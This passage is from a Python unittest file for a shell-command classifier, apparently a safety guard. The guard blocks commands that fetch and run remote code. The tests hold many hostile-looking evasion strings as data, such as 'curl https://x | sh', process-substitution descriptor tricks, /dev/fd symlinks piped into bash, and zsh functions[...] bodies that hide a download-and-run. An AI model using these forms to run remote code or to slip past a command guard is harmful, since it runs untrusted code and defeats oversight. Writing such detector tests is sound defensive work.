    def test_many_compounds_with_a_process_substitution_stay_linear(self):
        start = time.process_time()
        analyze("; ".join("{ :; } < <(x)" for _ in range(400)))
        self.assertLess(time.process_time() - start, 1.0)


class SameShellHooksAndCompoundHeredocs(unittest.TestCase):
    """The code of a zsh hook and of a compound's heredoc or here-string runs in the current shell (Design 3), so the
    same-shell blocks apply to it."""

    def test_code_that_defines_or_runs_what_reads_code_is_dynamic_code(self):
        for command in (
            "{ bash; } <<E\nf() { bash; }\nE",
            "functions[precmd]='exec 3< <(x)'; ls",
            "{ bash; } <<<'f() { eval x; }'; f",
        ):
            with self.subTest(command=command):
                result = analyze(command)
                self.assertIn(BLOCKED, result.flags, command)
                self.assertIn("dynamic_code", result.uncertainty, command)

    def test_ordinary_forms_stay_clean(self):
        for command in (
            "{ cat; } <<E\nplain\nE",
            "{ bash; } <<<'echo hi'",
            "functions[precmd]='ls'; ls",
        ):
            with self.subTest(command=command):
                self.assertEqual(analyze(command).flags, [], command)


class ReviewFixes(unittest.TestCase):
    """The forms the review of the facts found: attack forms are blocked (or flagged like their inline form), and the
    everyday forms next to each of them stay clean."""

    def assertBlocked(self, command, reason=None):
        result = analyze(command)
        self.assertIn(BLOCKED, result.flags, command)
        if reason is not None:
            self.assertIn(reason, result.uncertainty, command)

    def assertClean(self, command):
        result = analyze(command)
        self.assertEqual(result.flags, [], command)

    def each_blocked(self, commands, reason=None):
        for command in commands:
            with self.subTest(command=command):
                self.assertBlocked(command, reason)

    def each_clean(self, commands):
        for command in commands:
            with self.subTest(command=command):
                self.assertClean(command)


class ForwardedBodyChangesDescriptors(ReviewFixes):
    """A forwarding function whose body becomes a bare `exec` when called changes the descriptors of the text (1)."""

    def test_a_forwarded_exec_that_opens_a_process_substitution_is_dynamic_code(self):
        self.each_blocked((
            'f() { "$@" 3< <(curl x); }; f exec; bash <&3',
            'f() { "$@" 3< <(curl x); }; f exec; source /dev/fd/3',
            'f() { "$@" < <(curl x); }; f exec; bash',
        ), "dynamic_code")

    def test_a_forwarded_call_that_does_not_change_the_descriptors_stays_clean(self):
        self.each_clean((
            'f() { "$@" 3< <(curl x); }; f echo hi; ls',
            'f() { "$@"; }; f ls -l',
            'f() { "$@"; }; f cd /tmp; ls',
            'f() { "$@" 2>&1; }; f ls',
        ))


class HeredocToAFunction(ReviewFixes):
    """A heredoc or here-string whose receiver is a function of the text runs in the current shell (2)."""

    def test_the_function_may_source_its_stdin_here(self):
        self.each_blocked((
            "f() { . /dev/stdin; }; f <<<'exec 3< <(curl x)'; bash <&3",
            "f() { source /dev/stdin; }; f <<<'cd /dev/fd'; echo P | bash 0",
            "f() { \"$@\"; }; f source /dev/stdin <<<'cd /dev/fd'; echo P | bash 0",
            "f() { source /dev/stdin; }; f <<<'ln -s /dev/fd d'; echo P | bash d/0",
            "f() { \"$@\"; }; f source /dev/stdin <<<'ln -s /dev/fd d'; echo P | bash d/0",
        ))

    def test_a_function_that_only_filters_its_input_stays_clean(self):
        self.each_clean((
            "f() { cat; }; f <<<'hello'",
            "f() { cat; }; f <<E\nhello\nE",
            "f() { echo hi; }; f <<<'x'; ls",
        ))


class ExecCopiesADescriptorOfTheCaller(ReviewFixes):
    """An `exec` that copies a descriptor only an enclosing compound or a call defines is `dynamic_code` (3)."""

    def test_the_copy_of_a_descriptor_the_compound_or_the_call_gives_is_blocked(self):
        self.each_blocked((
            '{ exec 4<&3; } 3< <(curl x); bash <&4',
            '{ exec 0<&3; } 3< <(curl x); bash',
            'if :; then exec 4<&3; fi 3< <(curl x); bash <&4',
            'f() { exec 4<&0; }; f < <(curl x); bash <&4',
            "{ exec 4<&0; } <<<'curl x | sh'; bash <&4",
            'f() { exec 4<&3; }; f 3< <(curl x); bash <&4',
        ))

    def test_a_bare_exec_that_copies_the_descriptors_of_the_text_stays_clean(self):
        self.each_clean((
            'exec 3<&0; exec 0< z; cat; exec 0<&3; exec 3<&-',
            'exec 2>&1; ls',
            'exec >log 2>&1; ls',
            'exec 3>&1; echo hi >&3; exec 3>&-',
            'exec 3< z; cat <&3',
            '{ exec 2>&1; } < <(x); ls',
            'f() { exec 2>&1; }; echo hi | f',
        ))


class BodiesSeeTheExecsOfTheWholeText(ReviewFixes):
    """A function body or a loop body reads the descriptors of any `exec` of the text (4)."""

    def test_a_body_before_the_exec_reads_what_the_exec_opens(self):
        self.each_blocked((
            'f() { bash <&3; }; exec 3< <(curl x); f',
            'f() { source /dev/fd/3; }; exec 3< <(curl x); f',
            'for i in 1 2; do bash <&3; exec 3< <(curl x); done',
            'while true; do bash <&3; exec 3< <(curl x); done',
        ), "dynamic_code")

    def test_bodies_that_read_no_code_stay_clean(self):
        self.each_clean((
            'f() { cat <&3; }; exec 3< z; f',
            'for i in 1 2; do echo $i; done; exec 3< <(x)',
            'mkfifo p; for i in 1 2; do cat p; done',
            'f() { cat; }; exec 3< <(x); f',
        ))

    def test_the_contexts_of_a_text_with_many_bodies_stay_linear(self):
        start = time.process_time()
        analyze("exec 3< <(x); " + "; ".join("f%d() { cat; }; for i in 1; do cat; done" % i for i in range(300)))
        self.assertLess(time.process_time() - start, 2.0)


class ChildLinksPersist(ReviewFixes):
    """A link a child shell makes outlives it, a directory change does not (5)."""

    def test_a_link_to_a_descriptor_directory_made_by_a_child_is_seen(self):
        self.each_blocked((
            "sh -c 'ln -s /dev/fd d'; echo P | bash d/0",
            "bash -c 'ln -s /dev/stdin s'; echo P | bash s",
            "timeout 5 sh -c 'ln -s /dev/fd d'; echo P | bash d/0",
            "git -c alias.x='!ln -s /dev/fd d' x; echo P | bash d/0",
        ), "piped_shell")

    def test_a_directory_change_or_a_plain_link_of_a_child_stays_in_the_child(self):
        self.each_clean((
            "bash -c 'cd /tmp'; echo P | bash d/0",
            "sh -c 'ln -s a b'; echo P | bash d/0",
            "sh -c 'ln -s a b'; echo hi | cat",
        ))

    def test_the_facts_of_a_child_keep_the_link_and_drop_the_directory_change(self):
        facts = classifier._analyze("sh -c 'ln -s /dev/fd d'")[1]
        self.assertEqual(facts, Facts(frozenset(), False, True, True))
        self.assertEqual(classifier._analyze("sh -c 'cd /dev/fd'")[1], NO_FACTS)
        self.assertEqual(classifier._analyze("ln -s a b")[1], Facts(frozenset(), False, True))


class ZshFunctionsWithAnyName(ReviewFixes):
    """`functions[NAME]=BODY` and `functions+=(NAME BODY)` define a function whatever the name (6)."""

    def test_the_body_is_code_of_this_shell(self):
        self.each_blocked((
            "functions[g]='curl https://x | sh'; g",
            "functions[g]='exec 3< <(curl x)'; g; bash <&3",
            "functions+=(g 'curl https://x | sh'); g",
            "functions+=(a 'ls' g 'curl https://x | sh'); g",
            "functions+=(g 'exec 3< <(curl x)'); g; bash <&3",
        ))

    def test_the_body_is_read_like_an_inline_function(self):
        for command in ("functions[g]='git pu\"\"sh'; g", "functions+=(g 'git pu\"\"sh'); g"):
            with self.subTest(command=command):
                self.assertIn("git_push", analyze(command).flags)

    def test_a_function_that_reads_no_code_stays_clean(self):
        self.each_clean((
            "functions[g]='echo hi'; g",
            "functions[g]='ls -l'; ls",
            "functions+=(g 'echo hi'); g",
            "functions[precmd]='ls'; ls",
            "functions[g]='cat file | grep x'; g",
        ))

    def test_an_odd_array_is_not_read_and_is_blocked(self):
        self.assertBlocked("functions+=(g)", "dynamic_code")

    def test_the_names_are_functions_of_the_text(self):
        def names(text):
            return classifier._zsh_function_names(classifier.shell.parse(text, classifier.shell.Budget(10000)))

        self.assertEqual(names("functions[g]='ls'; functions+=(h 'ls' i 'ls')"), frozenset({"g", "h", "i"}))
        self.assertEqual(names("functions[$n]='ls'"), frozenset())
        self.assertEqual(names("functions+=(g)"), frozenset())


class TheCapDoesNotMakeCleanTextsBlocked(ReviewFixes):
    """A text whose facts take four rounds to settle is clean (7): the cap leaves room for the nested `mv` and the `exec`."""

    def test_a_nested_mv_and_an_exec_that_reads_the_pipe_settle(self):
        for command in (f"mk\"\"fifo p; bash -c 'mv p q'; {{ exec 3<&0; }} < z; cat <&3",
                        f"mk\"\"fifo p; eval 'mv p q'; {{ exec 3<&0; }} < z; cat <&3"):
            with self.subTest(command=command):
                self.assertClean(command)
                self.assertLessEqual(count_rounds(command)[0], classifier.MAX_FACT_ROUNDS)

    def test_the_round_cap_has_room_above_the_known_cases(self):
        self.assertGreaterEqual(classifier.MAX_FACT_ROUNDS, 4)


class FinalRoundFixes(ReviewFixes):
    """The last review round: repeated bodies, links outside the plain names, the zsh `functions` parameter."""

    # -- an exec that copies input in a function or loop body (1) ----------------------------------------------------

    def test_a_copy_of_input_in_a_body_that_runs_after_any_command_is_dynamic_code(self):
        self.each_blocked((
            'f() { exec 4<&3; }; exec 3< <(curl x); f; bash <&4',
            'f() { exec 0<&3; }; exec 3< <(curl x); f; bash',
            'f() { exec 4</dev/fd/3; }; exec 3< <(curl x); f; source /dev/fd/4',
            'for i in 1 2; do exec 4<&3; exec 3< <(curl x); done; bash <&4',
            'while :; do exec 0<&3; exec 3< <(curl x); done; bash',
        ), "dynamic_code")

    def test_bodies_that_only_rebind_output_stay_clean(self):
        self.each_clean(('f() { exec 2>&1; }; f; ls', 'for f in a b; do exec >log; done'))

    # -- a link that reaches outside the plain names makes any path a descriptor (2) ---------------------------------

    def test_any_path_may_be_a_descriptor_after_a_link_to_one(self):
        self.each_blocked((
            'ln -s /dev/fd /tmp/d; echo P | bash /tmp/d/0',
            "sh -c 'ln -s /dev/fd /tmp/d'; echo P | bash /tmp/d/0",
            'ln -s /dev/stdin /tmp/s; echo P | bash /tmp/s',
            'ln -s /dev/stdin ~/s; echo P | bash ~/s',
        ), "piped_shell")

    def test_a_plain_link_or_no_link_leaves_paths_alone(self):
        self.each_clean(('ln -s ../lib lib; bash lib/x.sh', 'ls; echo P | bash x.sh', 'ln -s a b; ls',
                         'cd /tmp; ls', "bash -c 'cd /tmp'; echo P | bash d/0"))

    def test_the_context_carries_the_link(self):
        ctx = classifier.shell.StdinContext.of({}, Facts(frozenset(), False, True, True))
        self.assertTrue(ctx.linked)
        self.assertEqual(ctx.facts(), Facts(frozenset(), False, True, True))
        self.assertFalse(classifier.shell.StdinContext.of({}, Facts(moved=True)).linked)

    # -- a link another program makes, or one made after a directory change (3) --------------------------------------

    def test_a_link_made_behind_another_program_or_after_a_cd_is_linked(self):
        self.each_blocked((
            "sh -c 'echo /dev/fd d | xargs ln -s'; echo P | bash d/0",
            "find /dev -maxdepth 0 -name fd -exec ln -s {} d \\;; echo P | bash d/0",
            "sudo sh -c 'cd /dev && ln -s fd d'; echo P | bash /dev/d/0",
        ), "piped_shell")

    def test_a_link_with_operands_as_written_is_not_linked(self):
        for command in ("ln -s a b", "sudo ln -s a b", "env ln -s a b"):
            with self.subTest(command=command):
                self.assertFalse(classifier._analyze(command)[1].linked)
        self.assertTrue(classifier._analyze("cd x; ln -s a b")[1].linked)

    # -- the zsh `functions` parameter set by any word or builtin (4) -----------------------------------------------

    def test_the_functions_parameter_set_in_any_way_is_dynamic_code(self):
        self.each_blocked((
            "set -A functions g 'curl x | sh'; g",
            "typeset 'functions[g]=curl x | sh'; g",
            "typeset -A functions=(g 'curl x | sh'); g",
            ": ${functions[g]::='curl x | sh'}; g",
            "print -v 'functions[g]' -r -- 'curl x | sh'; g",
            "printf -v 'functions[g]' %s 'curl x | sh'; g",
            "read -r 'functions[g]' <<<'curl x | sh'; g",
            "noglob functions[g]='curl x | sh'; g",
            "export functions[g]='curl x | sh'; g",
        ), "dynamic_code")

    def test_words_that_only_mention_functions_stay_clean(self):
        self.each_clean(('grep -r functions src/', 'echo functions', 'man zshparam', 'git log --grep=functions',
                         'export my_functions=1', "functions[g]='echo hi'; g"))

    # -- accepted false positives, pinned ----------------------------------------------------------------------------

    def test_the_accepted_false_positives_are_blocked(self):
        self.each_blocked((
            'exec 4>&3; ls', 'exec 5<&4; ls', 'functions+=(g)', '{ exec 4<&3; } 3< z; ls',
            'f() { cat; }; f <<E\ng() { bash; }\nE',
        ), "dynamic_code")


EVERYDAY = (
    "cd /home/x && pytest tests/test_a.py", "cd b && make", "pushd x; ls; popd", "cd x", "cd -", "cd ..; ls -la",
    "cd x && git status && git diff", "cd src && python3 -m unittest discover -s tests -t .",
    "cd x && npm test -- --watch=false", "cd x; cat a.txt | grep b", "cd x && cat a | head -n 3",
    "cd x && bash build.sh", "cd x && source .env && make", "cd x && sh -c 'make'", "cd x && bash -c 'ls | wc -l'",
    "cd x && eval \"$(ssh-agent)\"", "cd x && ./run.sh < input.txt", "cd x && echo hi | tee out.txt",
    "cd x && cat <<EOF\nhi\nEOF", "cd x && exec 3< a.txt && cat <&3", "cd x && ln -s a b && ls", "ln -s a b; cat b",
    "cd /tmp && ln -s /dev/fd d && echo x | bash d/0", "cd /dev/fd; echo x | bash 0", "pushd x && bash y.sh; popd",
    "(cd x && make)", "{ cd x; make; }", "cd x || exit 1; make", "if cd x; then make; fi", "for d in a b; do cd $d; make; done",
    "f() { cd x; }; f; ls", "cd x; bash < y.sh", "cd x; echo a | bash", "cd x; echo a | source /dev/stdin",
    "cd x && git log --oneline | head", "cd x && docker compose ps", "cd x && rtk git status",
    "cd x && find . -name '*.py' -exec grep -l foo {} +", "cd x && xargs -n1 echo < list",
    "cd x && parallel echo ::: a b", "cd x && sudo ln -s a b", "cd x && env FOO=1 make", "cd x && time make",
    "cd x && timeout 5 bash y.sh", "cd x && trap 'cd y' EXIT; ls", "cd x; eval cd y; ls", "cd x; bash -c 'cd y; ls'",
    "cd x && mv a b && ls", "cd x && cp a b", "mv a b; cat b", "echo hi > x; cat x", "ls | grep x",
    "git status", "make", "pytest tests/test_a.py -k b", "echo $(cd x; pwd)", "x=$(cd y && pwd); ls $x",
    f"{MKFIFO} p; cd x; bash < p", f"cd x; {MKFIFO} p; bash < p", f"cd x; {MKFIFO} p; mv p q; bash < q",
    f"{MKFIFO} p; cd x && bash -c 'cat < p'", f"cd x; {MKFIFO} p; echo hi > p &", f"cd x && eval '{MKFIFO} p'; bash < p",
    "cd x; exec 3< <(y); bash <&3", "exec 3< <(y); cd x; bash <&3", "cd x; exec < <(y); bash",
    "cd x && echo a | bash -c 'source 0'", "ln -s /dev/fd d; cd d; echo x | bash 0",
)


def attack_texts():
    """Every string of this module that is a command: the literals, and the f-strings that need only the module's names."""
    tree = ast.parse(Path(__file__).read_text())
    found = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.Constant, ast.JoinedStr)) and (not isinstance(node, ast.Constant) or isinstance(node.value, str)):
            try:
                value = node.value if isinstance(node, ast.Constant) else eval(compile(ast.Expression(node), "x", "eval"), globals())
            except Exception:
                continue
            if isinstance(value, str) and 1 < len(value) < 600 and (" " in value or ";" in value):
                found[value] = None
    return tuple(found)


def both(command):
    """The result of `_analyze` as the rounds run now and as they ran when any changed fact made one more."""
    now = classifier._analyze(command)
    with mock.patch.object(classifier, "_FORCE_FACT_ROUNDS", True):
        before = classifier._analyze(command)
    return now, before


class ReadFactsDecideTheRounds(unittest.TestCase):
    """A text is read again only when a fact the round consulted changed: a fact nobody asked about cannot change a
    decision, so the result is the one of the rounds forced until the facts stop changing."""

    def assertSame(self, command):
        now, before = both(command)
        self.assertEqual(now, before, command)

    def test_the_result_equals_the_forced_rounds_on_the_corpus_and_the_divergences(self):
        for command in CORPUS + tuple(text for text, _ in DIVERGENCES.values()):
            with self.subTest(command=command):
                self.assertSame(command)

    def test_the_result_equals_the_forced_rounds_on_every_text_of_this_module(self):
        texts = attack_texts()
        self.assertGreater(len(texts), 300)
        for command in texts:
            with self.subTest(command=command):
                self.assertSame(command)

    def test_the_result_equals_the_forced_rounds_on_everyday_forms(self):
        for command in EVERYDAY:
            with self.subTest(command=command):
                self.assertSame(command)

    def test_the_result_equals_the_forced_rounds_inside_wrappers(self):
        for command in CORPUS + EVERYDAY:
            for text in (f"echo x | {{ {command}\n}}", f"eval {sh_quote(command)}", f"bash -c {sh_quote(command)}",
                         f"cd y && {command}", f"{command}\ncd z\nbash"):
                with self.subTest(command=text):
                    self.assertSame(text)

    def test_the_forced_rounds_still_run_one_more_round_for_a_fact_nobody_read(self):
        with mock.patch.object(classifier, "_FORCE_FACT_ROUNDS", True):
            self.assertEqual(count_rounds("cd x && make")[0], 2)
        self.assertEqual(count_rounds("cd x && make")[0], 1)

    def test_a_directory_change_that_nothing_reads_takes_one_round(self):
        for command in ("cd /home/x && pytest tests/test_a.py", "cd b && make", "pushd x; ls; popd", "cd x && git status",
                        "cd x; cat a | grep b", "ln -s a b; ls", "(cd x && make)", "cd x && bash -c 'ls'"):
            with self.subTest(command=command):
                self.assertEqual(count_rounds(command)[0], 1)
                self.assertEqual(analyze(command).flags, [])

    def test_a_directory_change_that_a_reader_consults_still_takes_a_second_round(self):
        for command in ("cd x; bash y.sh", "cd /dev/fd; echo x | bash 0", "cd x; bash < y.sh", "cd x && source .env"):
            with self.subTest(command=command):
                self.assertEqual(count_rounds(command)[0], 2)

    def test_the_forms_that_need_the_fifos_of_the_text_still_take_their_rounds(self):
        self.assertEqual(count_rounds(f"{MKFIFO} p; bash < p")[0], 2)
        self.assertEqual(count_rounds(f"{MKFIFO} p; mv p q; bash < q")[0], 2)
        self.assertEqual(count_rounds(f"{MKFIFO} p; bash -c 'mv p q'; bash < q")[0], 3)
        self.assertEqual(count_rounds(f"{MKFIFO} p; {{ exec 3<&0; }} < p; bash <&3")[0], 3)
        for command in (f"mk\"\"fifo p; bash -c 'mv p q'; {{ exec 3<&0; }} < z; cat <&3",
                        f"mk\"\"fifo p; eval 'mv p q'; {{ exec 3<&0; }} < z; cat <&3"):
            with self.subTest(command=command):
                self.assertEqual(count_rounds(command)[0], 4)

    def test_the_facts_the_rounds_assume_are_the_forced_ones(self):
        for command in CORPUS + EVERYDAY:
            with self.subTest(command=command):
                now, before = both(command)
                self.assertEqual(now[1], before[1])

    def test_the_context_records_what_it_is_asked(self):
        shell = classifier.shell
        reads: set = set()
        context = shell.StdinContext.of({}, shell.Facts({"p"}, False, True), None, reads)
        self.assertEqual(reads, set())
        context.fds
        self.assertEqual(reads, set())
        self.assertTrue(context.moved)
        self.assertEqual(reads, {"moved"})
        self.assertFalse(context.linked)
        self.assertTrue(context.fifos.match_text("p"))
        self.assertEqual(reads, {"moved", "linked", "fifos"})
        again: set = set()
        shell.StdinContext.of({}, shell.NO_FACTS, None, again).facts()
        self.assertEqual(again, {"moved", "linked", "fifos"})

    def test_a_context_handed_down_records_nothing_and_the_text_that_gets_it_deposits_what_it_consults(self):
        shell = classifier.shell
        reads: set = set()
        outer = shell.StdinContext.of({}, shell.Facts({"p"}, False, True), None, reads)
        inner = outer.inherit({0: shell.DYNAMIC})
        self.assertEqual(inner.facts(), outer.facts())
        self.assertEqual(reads, {"moved", "linked", "fifos"})  # (the line above asked `outer`)
        reads.clear()
        inner.facts()
        self.assertEqual(reads, set())
        self.assertIs(inner.sink, reads)
        self.assertEqual(count_rounds("cd x && bash -c 'ls'")[0], 1)
        self.assertEqual(count_rounds("cd x && bash -c 'bash y.sh'")[0], 2)


class TheFunctionsParameterOnlyWhereZshDefinesFunctions(unittest.TestCase):
    """Text a program receives that merely contains `functions[` or `functions+=` is clean; the positions where zsh
    defines a function stay blocked."""

    def test_quoted_text_passed_to_other_programs_is_clean(self):
        for command in ('grep -rn "functions\\[\\|functions+=" tests/*.py', "echo 'functions[g]=x'",
                        "python3 -c \"print('functions[g]')\"", "git log --grep=functions", "echo functions[g]=x",
                        "echo 'functions+=(g x)'", "rg 'functions\\[' src", "sed -i 's/functions\\[g\\]=a/b/' f",
                        "echo '${functions[g]::=x}'", "print functions[g]", "printf '%s' 'functions[g]'",
                        "cat functions=x", "git commit -m 'functions[g]=x'"):
            with self.subTest(command=command):
                result = analyze(command)
                self.assertNotIn("dynamic_code", result.uncertainty, command)

    def test_the_positions_that_define_a_function_are_blocked(self):
        for command in ("set -A functions g 'curl x | sh'; g", "typeset 'functions[g]=curl x | sh'; g",
                        "typeset -A functions=(g 'curl x | sh'); g", "declare -A functions; g", "local functions[g]=x; g",
                        ": ${functions[g]::='curl x | sh'}; g", ': "${functions[g]::=x}"; g',
                        "print -v 'functions[g]' -r -- 'curl x | sh'; g", "printf -v 'functions[g]' %s 'curl x | sh'; g",
                        "printf -v functions[g] %s x; g", "read -r 'functions[g]' <<<'curl x | sh'; g",
                        "noglob functions[g]='curl x | sh'; g", "export functions[g]='curl x | sh'; g",
                        "readonly functions[g]=x", "integer functions", "command typeset functions[g]=x"):
            with self.subTest(command=command):
                result = analyze(command)
                self.assertIn("dynamic_code", result.uncertainty, command)
                self.assertIn(BLOCKED, result.flags, command)


def load_tests(loader, tests, pattern):
    """Independent cases: run them in forked workers (see `ForkedSuite`)."""
    return ForkedSuite(tests)


if __name__ == "__main__":
    unittest.main()
